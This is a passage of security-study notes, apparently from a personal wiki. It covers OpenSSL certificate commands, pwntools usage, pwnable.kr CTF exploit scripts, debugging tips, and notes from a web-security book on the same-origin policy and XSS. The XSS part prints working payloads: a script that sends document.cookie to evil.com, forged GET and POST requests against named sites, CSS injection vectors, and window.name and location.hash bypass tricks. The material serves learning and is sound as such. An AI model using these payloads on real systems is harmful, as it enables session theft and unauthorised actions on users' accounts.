 Generate a private key and a CSR #  This command creates a 2048-bit private key (domain.key) and a CSR (domain.csr) from scratch:\n$ openssl req \\  -newkey rsa:2048 -nodes -keyout domain.key \\  -out domain.csr   The -newkey rsa:2048 option specifies that the key should be 2048-bit, generated using the RSA algorithm.\n  The -nodes option specifies that the private key should not be encrypted with a pass phrase.\n  The -new option, which is not included here but implied, indicates that a CSR is being generated.\n  Generate a CSR from a existing private key #  This command creates a new CSR (domain.csr) based on an existing private key (domain.key):\n$ openssl req \\  -key domain.key \\  -new -out domain.csr  The -key option specifies an existing private key (domain.key) that will be used to generate a new CSR. The -new option indicates that a CSR is being generated.  Generate a CSR from an existing certificate and private key #  This command creates a new CSR (domain.csr) based on an existing certificate (domain.crt) and private key (domain.key):\n$ openssl x509 \\  -in domain.crt \\  -signkey domain.key \\  -x509toreq -out domain.csr  The -x509toreq option specifies that you are using an X509 certificate to make a CSR.  "},{"id":54,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/openssl/3.generatessl/","title":"3. Generate Ssl","section":"openssl","content":"Generating SSL Certificates #  If you would like to use an SSL certificate to secure a service but you do not require a CA-signed certificate, a valid (and free) solution is to sign your own certificates.\nA common type of certificate that you can issue yourself is a self-signed certificate. Therefore, self-signed certificates should only be used if you do not need to prove your service\u0026rsquo;s identity to its users (e.g. non-production or non-public servers).\nGenerate a self-signed certificate #  This command creates a 2048-bit private key (domain.key) and a self-signed certificate (domain.crt) from scratch:\n$ openssl req \\  -newkey rsa:2048 -nodes -keyout domain.key \\  -x509 -days 365 -out domain.crt  The -x509 option tells req to create a self-signed certificate. The -days 365 option specifies that the certificate will be valid for 365 days. A temporary CSR is generated to gather information to associate with the certificate.  Generate a self-signed certificate from a existing private key #  This command creates a self-signed certificate (domain.crt) from an existing private key (domain.key):\n$ openssl req \\  -key domain.key \\  -new \\  -x509 -days 365 -out domain.crt  The -x509 option tells req to create a self-signed certificate.  "},{"id":55,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/openssl/4.viewcertificate/","title":"4. View Certificate","section":"openssl","content":"View Certificates #  CSR Entries #  This command allows you to view and verify the contents of a CSR (domain.csr) in plain text:\n$ openssl req -text -noout -verify -in domain.csr Certificate Entries #  This command allows you to view the contents of a certificate (domain.crt) in plain text:\n$ openssl x509 -text -noout -in domain.crt Verify a Certificate was Signed by a CA #  Use this command to verify that a certificate (domain.crt) was signed by a specific CA certificate (ca.crt):\n$ openssl verify -verbose -CAFile ca.crt domain.crt "},{"id":56,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/openssl/5.privatekey/","title":"5. Private Key","section":"openssl","content":"Private Key #  Create a Private Key #  Use this command to create a password-protected, 2048-bit private key (domain.key):\n$ openssl genrsa -des3 -out domain.key 2048 Verify a Private Key #  Use this command to check that a private key (domain.key) is a valid key:\n$ openssl rsa -check -in domain.key Verify a Private Key Matches a Certificate and CSR #  Use these commands to verify if a private key (domain.key) matches a certificate (domain.crt) and CSR (domain.csr):\n$ openssl rsa -noout -modulus -in domain.key | openssl md5 $ openssl x509 -noout -modulus -in domain.crt | openssl md5 $ openssl req -noout -modulus -in domain.csr | openssl md5 Encrypt a Private Key #  This takes an unencrypted private key (unencrypted.key) and outputs an encrypted version of it (encrypted.key):\n$ openssl rsa -des3 \\  -in unencrypted.key \\  -out encrypted.key Decrypt a Private Key #  This takes an encrypted private key (encrypted.key) and outputs a decrypted version of it (decrypted.key):\n$ openssl rsa \\  -in encrypted.key \\  -out decrypted.key "},{"id":57,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/openssl/6.convertformats/","title":"6. Convert Formats","section":"openssl","content":"Convert Formats #  All of the certificates that we have been working with have been X.509 certificates that are ASCII PEM encoded.\nOpenSSL can be used to convert certificates to and from a large variety of these formats. This section will cover a some of the possible conversions.\nConvert PEM to DER #  Use this command if you want to convert a PEM-encoded certificate (domain.crt) to a DER-encoded certificate (domain.der), a binary format:\n$ openssl x509 \\  -in domain.crt \\  -outform der -out domain.der Convert DER to PEM #  Use this command if you want to convert a DER-encoded certificate (domain.der) to a PEM-encoded certificate (domain.crt):\n$ openssl x509 \\  -inform der -in domain.der \\  -out domain.crt Convert PEM to PKCS7 #  Use this command if you want to add PEM certificates (domain.crt and ca-chain.crt) to a PKCS7 file (domain.p7b):\n$ openssl crl2pkcs7 -nocrl \\  -certfile domain.crt \\  -certfile ca-chain.crt \\  -out domain.p7b Note that you can use one or more -certfile options to specify which certificates to add to the PKCS7 file.\nPKCS7 files, also known as P7B, are typically used in Java Keystores and Microsoft IIS (Windows). They are ASCII files which can contain certificates and CA certificates.\nConvert PKCS7 to PEM #  Use this command if you want to convert a PKCS7 file (domain.p7b) to a PEM file:\n$ openssl pkcs7 \\  -in domain.p7b \\  -print_certs -out domain.crt Convert PEM to PKCS12 #  Use this command if you want to take a private key (domain.key) and a certificate (domain.crt), and combine them into a PKCS12 file (domain.pfx):\n$ openssl pkcs12 \\  -inkey domain.key \\  -in domain.crt \\  -export -out domain.pfx Convert PKCS12 to PEM #  Use this command if you want to convert a PKCS12 file (domain.pfx) and convert it to PEM format (domain.combined.crt):\n$ openssl pkcs12 \\  -in domain.pfx \\  -nodes -out domain.combined.crt "},{"id":58,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/pwntools/1.gettingstarted/","title":"1. Getting Started","section":"pwntools","content":" 学习网址：http://docs.pwntools.com/en/stable/intro.html\n Getting Started #  from pwn import * This imports a lot of functionality into the global namespace. You can now assemble, disassemble, pack, unpack, and many other things with a single function.\nA full list of everything that is imported is available on from pwn import \nMaking Connections #  Pwntools talk to the challenge binary in order with its pwnlib.tubes module.\nRemote connect #  pwnlib.tubes.remote：\n\u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; conn = remote(\u0026#34;ftp.ubuntu.com\u0026#34;,21) \u0026gt;\u0026gt;\u0026gt; conn.recvline() \u0026#39;220 ...\u0026#39; \u0026gt;\u0026gt;\u0026gt; conn.send(\u0026#39;USER anonymous\\r\\n\u0026#39;) \u0026gt;\u0026gt;\u0026gt; conn.recvuntil(\u0026#39; \u0026#39;, drop=True) \u0026#39;331\u0026#39; \u0026gt;\u0026gt;\u0026gt; conn.recvline() \u0026#39;Please specify the password.\\r\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; conn.close()  NOTICE:\nThe \\n at the end of input is important because most c like program treat \\n as the sign to flush buffer area.\n It\u0026rsquo;s also easy to spin up a listener:\n\u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; l = listen(8080) \u0026gt;\u0026gt;\u0026gt; r = remote(\u0026#39;localhost\u0026#39;, l.lport) \u0026gt;\u0026gt;\u0026gt; c = l.wait_for_connection() \u0026gt;\u0026gt;\u0026gt; r.send(\u0026#39;hello\u0026#39;) \u0026gt;\u0026gt;\u0026gt; c.recv() Processes connect #  pwnlib.tubes.process：\n\u0026gt;\u0026gt;\u0026gt; sh = process(\u0026#39;/bin/sh\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.sendline(\u0026#39;sleep 3; echo hello world;\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=1) \u0026#39;\u0026#39; \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=5) \u0026#39;hello world\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; sh.close() Not only can you interact with processes programmatically, but you can actually interact with processes.\n\u0026gt;\u0026gt;\u0026gt; sh.interactive() $ whoami user SSH connect #  pwnlib.tubes.ssh：\n\u0026gt;\u0026gt;\u0026gt; shell = ssh(\u0026#39;bandit0\u0026#39;, \u0026#39;bandit.labs.overthewire.org\u0026#39;, password=\u0026#39;bandit0\u0026#39;, port=2220) \u0026gt;\u0026gt;\u0026gt; shell[\u0026#39;whoami\u0026#39;] \u0026#39;bandit0\u0026#39; \u0026gt;\u0026gt;\u0026gt; shell.download_file(\u0026#39;/etc/motd\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh = shell.run(\u0026#39;sh\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.sendline(\u0026#39;sleep 3; echo hello world;\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=1) \u0026#39;\u0026#39; \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=5) \u0026#39;hello world\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; shell.close() "},{"id":59,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/pwntools/%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/","title":"新手教程","section":"pwntools","content":" 学习网址：\n https://bbs.pediy.com/thread-247217.htm   pwntools 新手教程 #  Hello World #  C 程序源代码（./1.c）：\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;void func(int key){ char overflowme[32]; printf(\u0026#34;overflow me : \u0026#34;); gets(overflowme); // smash me!  if(key == 0xcafebabe){ system(\u0026#34;/bin/sh\u0026#34;); } else{ printf(\u0026#34;Nah..\\n\u0026#34;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } exp 脚本（./1.py）：\nfrom pwn import * c = remote(\u0026#34;pwnable.kr\u0026#34;, 9000) c.sendline(\u0026#34;AAAA\u0026#34; * 13 + p32(0xcafebabe)) c.interactive() ShellCode #  获取源码和可执行文件的方式，需要先通过 ssh 连接的目标主机：\nssh -p2222 asm@pwnable.kr # 输入密码 guest 或者直接通过 scp 下载文件：\nscp -P 2222 asm@pwnable.kr:~/asm ./ # 输入密码 guest scp -P 2222 asm@pwnable.kr:~/asm.c ./ # 输入密码 guest exp.py 的内容：\nfrom pwn import * p = process(\u0026#34;./asm\u0026#34;) context.log_level = \u0026#39;DEBUG\u0026#39; gdb.attach(p) context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) shellcode = shellcraft.amd64.pushstr(\u0026#34;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\u0026#34;) shellcode += shellcraft.amd64.linux.open(\u0026#39;rsp\u0026#39;,0,0) shellcode += shellcraft.amd64.linux.read(\u0026#39;rax\u0026#39;,\u0026#39;rsp\u0026#39;,0) shellcode += shellcraft.amd64.linux.write(1, \u0026#39;rsp\u0026#39;, 100) p.recvuntil(\u0026#39;shellcode: \u0026#39;) p.send(asm(shellcode)) log.success(p.recvall()) 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程 attach 到 gdb 上。Attach 之后，gdb 便可以调试该程序来（设置 breakpoints，查看 stack，以及简单的反汇编）。\n"},{"id":60,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/pwntools/%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/","title":"调试环境部署","section":"pwntools","content":"调试环境部署 #  "},{"id":61,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/tips/","title":"Tips","section":"工具","content":"TIPS #  PWN #  记录一些命令：\n命令行工具 #    检查安全性（已经安装了 pwntools，在 peda 等 gdb 插件中也支持）：\n$ checksec \u0026lt;program\u0026gt;   代码段全部汇编代码（objdump）：\n$ objdump -d \u0026lt;program\u0026gt;   ROPgadget 得到指定的指令链或字符串：\n# pop-ret 指令链 $ ROPgadget --binary \u0026lt;program\u0026gt; --only \u0026#39;pop|ret\u0026#39; # /bin/sh 字符串 $ ROPgadget --binary \u0026lt;program\u0026gt; --string \u0026#39;/bin/sh\u0026#39;    gdb #    列出程序中的所有变量名（gdb）：\n(gdb) info variables   列出程序中的所有函数名（gdb）：\n(gdb) info functions   列出一个函数的汇编代码（gdb）：\n(gdb) disas main   查看指定地址内的字符串（gdb）：\n(gdb) x /s \u0026lt;memory_address\u0026gt;   查看各个程序段的读写执行权限（gdb：gef 插件或 peda 插件都支持）\n(gdb-peda) vmmap   查看堆的信息以及按结构解析堆：\n(gdb-peda) heapinfo (gdb-peda) parseheap   python #    查看一个类的结构：\nprint vars(cls)   Crypto #  sage #    比特流转换为整数：\nZZ([1,1,0,1],base=2) 这种方式与 int('1101',2) 转换的结果相反，它等价于 int('1011', 2)\n  整数转化为比特流：\nInteger(15).binary()   在 sage 中，通过多项式建立一个有限域：\nsage: FF = GF(2**8, name=\u0026#39;x\u0026#39;, modulus=x^8 + x^4 + x^3 + x + 1) 在这个有限域中，整数与多项式相互转化：\n# 整数转化为多项式 sage: FF.fetch_int(5) x^2 + 1 # 多项式转化为整数 sage: FF(x^2 + 1).integer_representation() 5    "},{"id":62,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/vmware/networkconfig/","title":"Networkconfig","section":"vmware","content":" 学习地址：\n https://www.vmware.com/support/ws5/doc/ws_net_configurations_common.html https://www.cnblogs.com/wushuaishuai/p/9258849.html#_label3   关于 vmware 虚拟机的虚拟网络编辑器 #  桥接模式 (Bridged Networking) #  桥接模式就是 将主机网卡与虚拟机虚拟的网卡 利用虚拟网桥进行通信。\n在桥接的作用下，类似于把物理主机 虚拟为一个交换机，所有桥接设置的虚拟机 连接到这个交换机的一个接口上，物理主机也同样 插在这个交换机当中，所以所有 桥接下的网卡与主机网卡 都是交换模式的，相互可以访问而不干扰。\n在桥接模式下，虚拟机 ip 地址需要与主机在同一个网段，如果需要联网，则网关与 DNS 需要与主机网卡一致。\n"},{"id":63,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/","title":"1.浏览器安全","section":"1.客户端安全","content":"浏览器安全 #  同源策略 #  什么是同源策略（Same Origin Policy）？\n 浏览器的同源策略，限制了来自不同源的 document 或脚本之间的读取访问。  源的因素有很多种：域名与子域名、IP 地址、端口、协议。\nsrc 属性资源文件的加载：\n  需要注意的是，存放 JS 文件的域并不重要；重要的是 JS 文件加载的域。\n  在浏览器中 \u0026lt;script\u0026gt;、\u0026lt;img\u0026gt;、\u0026lt;iframe\u0026gt;、\u0026lt;link\u0026gt; 等标签都可以被跨域加载资源，而不受同源策略的限制。\n  这些带 src 属性的标签每次加载时，实际上是由浏览器发起了一次 GET 请求。\n  不同于 XMLHttpRequest 的是：通过 src 属性加载的资源，浏览器限制了其权限（不能读写返回的内容）。\n  XMLHttpRequest 请求：\n  如果 XMLHttpRequest 能够跨域访问资源，则可能会导致一些敏感资源的泄露。比如：CSRF 的 token，从而导致发生安全问题。\n  随着业务的发展，W3C 委员会制定了 XMLHttpRequest 跨域访问标准：它需要通过目标域返回的 HTTP 头来授权是否允许跨域访问。\n安全性基于：因为 HTTP 请求头一般是无法被 JS 控制的，所以认为这个方案是可以实施的。\n  对于浏览器来说，除了 DOM、Cookie、XMLHttpRequest 会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。最常见的比如：Flash、Java Applet、Silverlight、Google Gears 等都有自己同源策略。\n浏览器沙箱 #  黑客圈子名词 挂马：\n 在网页中插入一段恶意代码，利用浏览器漏洞执行任意代码的攻击方式。  浏览器的多进程架构，将浏览器的各个功能模块分开，各个浏览器实例分开，当一个进程崩溃时，也不会影响到其他的进程。\nGoogle-Chrome 是第一个采取多进程架构的浏览器。它的主要进程分有：\n 浏览器进程、渲染进程、插件进程（如 pdf、java、flash）、扩展进程。  沙箱的应用范围非常广泛。而对于浏览器来说，采用 SandBox 技术让不受信任的网页代码运行在一个受到限制的环境中，从而保护本地桌面系统的安全。\nGoogle-Chrome 实现了一个相对完整的沙箱（官网）：\n恶意网址拦截 #  浏览器拦截恶意网址的功能都是基于 ”黑名单“ 的，如果用户上网时发信啊网址存在于黑名单中，浏览器会弹出一个 警告页面。\n常见的恶意网址分为两类：\n 挂马网站，这些网站通常包含有恶意的脚本比如 Flash 或 JavaScript，通过利用浏览器的漏洞执行 shellcode 插入木马； 钓鱼网站，通过模仿知名网站的相似页面来欺骗用户。  要识别恶意网站建立黑名单：\n  需要许多基于页面的特征，而这些模型显然是不适合放在客户端的。攻击者会分析研究并绕过这些规则，而且收集用户访问的历史纪录也是一种侵犯隐私的行为。\n  一些有实力的浏览器厂商会自建有安全团队对恶意网址进行识别，这份黑名单对于搜索引擎来说也是其核心竞争力之一。\n  PhishTank 是互联网上免费的提供恶意网址黑名单的组织之一，它由世界各地的志愿者提供。\n  Google 也公开了 SafeBrowsing API，任何组织或个人都可以在产品中接入。\n  除此之外，EV SSL 证书（Extended Validation SSL Certificate）可以进行白名单标识。\n"},{"id":64,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/","title":"2.跨站脚本攻击 Xss","section":"1.客户端安全","content":"跨站脚本攻击（XSS） #   OWASP TOP 10 威胁曾多次把 XSS 列在榜首。\n XSS 简介 #  跨站脚本攻击：\n Cross Site Script (XSS)。通常指黑客通过 HTML 注入的方式篡改了网页、插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。  XSS 根据效果不同可以分为如下几类：\n 反射型 XSS，或称 “非持久型 XSS”（Non-persistent XSS）。只是简单地把用户的输入 “反射” 给浏览器。 存储型 XSS，或称 “持久型 XSS”（Persistent XSS）。会把用户输入的数据 “存储” 在服务端，这种 XSS 具有很强的稳定性。 DOM Based XSS。这种 XSS 从效果上来看也属于反射型 XSS。与后者的区别是通过更改 DOM 树的方式而非执行 JavaScript 代码的方式进行攻击。  XSS Payload #  窃取 Cookie #  最常见的 XSS Payload 就是读取浏览器的 cookie 对象：\nvar img = document.createElement(\u0026#34;img\u0026#34;); img.src = \u0026#34;http://www.evil.com/log?\u0026#34;+escape(document.cookie) document.body.appendChild(img) 这段代码会在页面中插入一张看不见的图片，同时把 document.cookie 对象作为参数发送到远程的服务器。事实上，/log 路径不一定要存在，因为这个请求会在远程服务器的 WEB 日志中留下记录。这样就做完了一个最简单的窃取 cookie 的 XSS payload。\nCookie 的 HttpOnly 标识可以防止 \u0026ldquo;Cookie 劫持\u0026rdquo;，有的网站则会把 Cookie 与客户端的 IP 绑定。\n构造 GET 请求 #  比如搜狐上有一篇文章，它删除文章的链接是这样的：\nhttp://blog.sohu.com/message/entry.do?m=delete\u0026amp;id=1000\r对于攻击者来说，则只需要构造夏敏的一个 payload 就可以发起一个删除文章的 GET 请求：\nvar img = document.createElement(\u0026#34;img\u0026#34;); img.src = \u0026#34;http://blog.sohu.com/message/entry.do?m=delete\u0026amp;id=1000\u0026#34; document.body.appendChild(img) 构造 POST 请求 #  比如豆瓣上有一处的表单提交是这样两个字段 ck 与 mb_text，我们尝试模拟这个过程。要模拟 POST 请求的过程有两种方式。\n第一种方式是构造一个 form 表单，然后自动提交这个表单。\nvar f = document.createElement(\u0026#34;form\u0026#34;); Object.assign(f, {\u0026#34;action\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;post\u0026#34;}); document.body.appendChild(f); var i1 = document.createElement(\u0026#34;input\u0026#34;); Object.assign(i1, {\u0026#34;name\u0026#34;: \u0026#34;ck\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;JiUY\u0026#34;}); f.appendChild(i1); var i2 = document.createElement(\u0026#34;input\u0026#34;); Object.assign(i2, {\u0026#34;name\u0026#34;: \u0026#34;mb_text\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;testtesttest\u0026#34;}); f.appendChild(i2); f.submit(); // 如果表单的参数很多的话可以通过直接构造 DOM 节点的方式 第二种方法是，通过 XMLHttpRequest 发送一个 POST 请求：\nvar url = \u0026#34;http://www.douban.com\u0026#34;; var postStr = \u0026#34;ck=JiUY\u0026amp;mb_text=testtesttest\u0026#34;; var ajax = null if (windows.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if (windows.ActiveXObject) { ajax = new ActiveXObject(\u0026#34;Microsoft.XMLHTTP\u0026#34;); } else { console.log(\u0026#34;You broswer doesn\u0026#39;t support XMLHttpRequest.\u0026#34;); return; } ajax.open(\u0026#34;POST\u0026#34;, url, true); ajax.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); ajax.send(postStr); ajax.onreadystatechange = function(){ if(ajax.readyState == 4 \u0026amp;\u0026amp; ajax.status == 200) alert(\u0026#34;Done!\u0026#34;); } 识别用户浏览器 #  最直接的方式是通过 XSS 读取浏览器的 UserAgent 对象：\nalert(natigator.userAgent); 但是浏览器有许多扩展可以更改这个值，或者可以自定义浏览器发送的 UserAgent，所以通过 JavaScript 取出来的这个浏览器对象，信息不一定准确。\n但对于攻击者来说，还有另一种技巧，可以准确地识别用户的浏览器版本。由于浏览器置键的实现存在差异，不同的浏览器会各自实现一些独特的功能，所以通过分辨写这些浏览器之间的差异，就能准确地判断出浏览器版本，而几乎不会误报。\n识别用户安装的软件 #  在 IE 浏览器中，可以通过判断 ActiveX 控件的 classid 是否存在，来推测用户是否安装了软件：\ntry { var Obj = new ActivetXObject(\u0026#34;XunLeiBHO.ThunderIDHelper\u0026#34;); } catch (e) { alert(\u0026#34;用户未安装迅雷\u0026#34;); } 浏览器的扩展和插件也能被扫描出来。比如 FireFox 的插件列表存放在一个 DOM 对象中，通过查询 DOM 可以遍历出所有的插件。这个 DOM 对象可以通过 navigator.plugins 访问，因此通过这个方式就可以找到所有的插件。\n在 FireFox 中有一个特殊的协议 chrome://，FireFox 的扩展图标可以通过这个协议被访问到。比如 Flash Got 扩展的图标可以这样访问：chrome://flashgot/skin/icon32.png。因此扫描 FireFox 扩展时，只需要在 JavaScript 中加载这张图片检测扩展：\nvar m = new Image(); m.onload = function(){ alert(\u0026#34;Image Exists.\u0026#34;); }; m.onerror = function(){ alert(\u0026#34;Image not Exists.\u0026#34;); }; m.src = \u0026#34;chrome://flashgot/skin/icon32.png\u0026#34;; CSS History Hack #  这个 XSS Payload 可以通过 CSS，来发现一个用户曾经访问过的网站。\n这个技巧最早被 Jeremiah Grossman 发现，其原理是利用 style 的 visited 属性（如果用户访问过某个链接，则这个链接颜色会不同）。\n但是这个漏洞在 2010 年已经被 Mozilla 浏览器修复。\n获取用户的真实 IP #  JavaScript 本身并没有提供获取本地 IP 地址的能力。一般来说，XSS 攻击需要借助第三方软件来完成。比如如果客户端安装了 Java 环境（JRE），那么 XSS 就可以通过调用 Java Applet 的接口获取客户端的本地 IP 地址。\n利用 CSS 构造 #  在 2005 年，年仅 19 随的 Samy Kamkar 对 MySpace.com 发起的 XSS 攻击。就利用了这个方法进行构造。\nMySpace 过滤了许多危险的 HTML 标签，只保留了 \u0026lt;a\u0026gt;, \u0026lt;img\u0026gt;, \u0026lt;div\u0026gt; 等安全的标签，所有的事件比如 onclick 等也被过滤了。允许用户控制标签的 style 属性，我们通过 style，还是有办法构造出 XSS 的。比如以下的这些方式：\n  利用 import 形成 GET 请求：\n\u0026lt;style\u0026gt;@import \u0026#39;http://hackers.org/xss.css\u0026#39;;\u0026lt;/style\u0026gt;   通过 moz-binding 嵌入 xml 文件（这一特性已被标准删除）：\n\u0026lt;style\u0026gt;body{-moz-binding: url(\u0026#34;http://hackers.org/xssmoz.xml#xss\u0026#34;)}\u0026lt;/style\u0026gt;   通过请求背景图片或一些资源，通过伪协议执行 javascript 代码：\n\u0026lt;div style=\u0026#34;background:url{\u0026#39;javascript:alert(1)\u0026#39;}\u0026#34; /\u0026gt;   通过表达式构造 XSS:\n\u0026lt;div style=\u0026#34;width: expression(alert(\u0026#39;xss\u0026#39;))\u0026#34; /\u0026gt;   通过 behavior 关键字执行 javascript 代码：\n\u0026lt;div style=\u0026#34;behavior: url(xss.htc)\u0026#34; /\u0026gt;   攻击框架 #  原书中介绍了 Attack API、BeEF、XSS Proxy 这样三个攻击平台。\nXSS Worm #  蠕虫：\n 以往的蠕虫是利用服务端软件漏洞进行传播的。比如 2003 年的冲击波蠕虫，利用的是 Windows 的RPC 远程溢出漏洞。  XSS Worm 是 XSS 的一种终极利用方式，它的破坏力与影响力是巨大的。但是发起 XSS Worm 攻击也有一定的条件。一般来说，用户之间发生交互行为的页面，如果存在存储型 XSS，则比较容易发起 XSS Worm 攻击。\n原书中介绍了 Samy Worm 与百度空间蠕虫两个蠕虫。因为年代久远，参考价值不大。\nXSS 的绕过 #  利用字符编码 #  就是 GBK/GBK2312 宽字符集漏洞。在这个字符集中 %c1 这个字符与 \\ 反斜杠构成一个完整的 Unicode 字符。比如使用以下的 payload：\n%c1\u0026#34;;alert(XSS);// 其中 \u0026quot; 会被逃逸（即在符号前面插入 \\ 这个字符），但是因为前面的介绍，在宽字符集中，这个反斜杠会被我们的 %c1 吃掉形成一个 Unicode 字符，从而使 ; 逃逸出来。\n绕过长度限制 #  比如 url 为 http://www.a.com/index.html 中的 html 存在通过下面的方式渲染：\n\u0026lt;input type=text value=\u0026#34;$var\u0026#34; /\u0026gt; 如果服务端对字符串的长度做了限制，那么攻击者直接构造 \u0026lt;script\u0026gt; 标签则可能会导致过长：\n  第一种办法是将 JavaScript 代码绑定到一个事件中去，比如：\n$var 赋值为 \u0026quot;onclick=alert(1)//\r  但是利用 事件 能够缩短的字节数是有限的。最好的办法是将 XSS Payload 写到别处。\n最常用的一个“隐藏代码”的地方就是 location.hash。而且根据 HTTP 协议，这个内容不会再网络请求中发送，所以 WEB 服务器也不会记录我们隐藏的内容。\n因为 location.hash 的第一个字符是 #，所以必须去除第一个字符才行，所以可以构造：\n$var 赋值为 \u0026quot;onclick=\u0026quot;eval(location.hash.substr(1))\r同时构造一个 HTML url 为：\nhttp://www.a.com/index.html#alert(1)\r  再某些环境下，可以利用注释符绕过长度限制。\n比如我们能控制两个文本框，第二个文本框允许写入更多的字节。此时可以利用 HTML 的注释符号，把两个文本框之间的代码全部注释掉，从而 “打通” 两个 \u0026lt;input\u0026gt; 标签。\n  \u0026lt;base\u0026gt; 标签 #  这个标签的作用是定义页面上使用 “相对路径” 标签的 hosting 地址。比如：\n\u0026lt;body\u0026gt; \u0026lt;base href=\u0026#34;http://www.google.com/\u0026#34; /\u0026gt; \u0026lt;img src=\u0026#34;/int1/en_ALL/images/srpr/logolw.png\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; 上面这段代码将会使得 \u0026lt;img\u0026gt; 标签中的图片从 http://www.google.com/int1/en_ALL/images/srpr/logolw.png 取得。\n可见 \u0026lt;base\u0026gt; 标签是个极其危险的标签。所以在设计 XSS 安全方案时，一定要过滤掉这个非常危险的标签。\nwindow.name 的使用 #  window.name 对象是一个神奇的东西。如果对当前窗口的 window.name 对象赋值，没有特殊字符的限制。因为 window 对象是浏览器的窗体，而非 document 对象，很多时候不受同源策略的限制。攻击者利用这个对象，可以实现跨页面传递数据。\n比如 www.a.com/index.html 的代码如下：\n\u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.name = document.cookie; window.location = \u0026#34;http://www.b.com/index.html\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; 这段代码将把在域 www.a.com 中的 cookie 携带到 www.b.com 这个域中。在后者中可以访问这个内容：\n\u0026lt;body\u0026gt; \u0026lt;script\u0026gt; console.log(window.name); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; 使用 window.name 可以缩短 XSS Payload 的长度，在目标站点只需要执行以下代码即可：\neval(name); 这个只有 11 个字符。\n这个技巧为安全研究者 luoluo 发现，另外它还整理了许多 XSS 长度绕过技巧（见 《突破 XSS 字符数量限制执行任意 JS 代码》）。\n利用反射型 XSS #  Apache Expect Header XSS #  这个漏洞最早公布于 2006 年。\n这是 Apache 的漏洞，影响范围相当广。但是这个利用这个漏洞，需要提交请求时向 HTTP 头中注入恶意数据，才能触发这个漏洞。但对于 XSS 攻击来说，JavaScript 时无法控制 HTTP 请求头的。所以这个漏洞曾经一度被认为是 “鸡肋” 漏洞。\n后来安全研究者 \u0026ldquo;Amit Klein\u0026rdquo; 提出了 “使用 Flash 构造请求” 的方法，成功利用了这个漏洞。\nAnehta 的回旋镖 #  反射型 XSS 也有可能像存储型 XSS 一样利用，将要利用的反射型 XSS 嵌入一个存储型 XSS 中。这个攻击技巧，曾经在 Anehta（道哥写过的一个攻击平台）中使用过。\n回旋镖的思路是：\n 如果在 B 域上存在一个反射型的 \u0026ldquo;XSS_B\u0026rdquo;，在 A 域上存在一个存储型 ”XSS_A“； 当用户访问 A 域上的 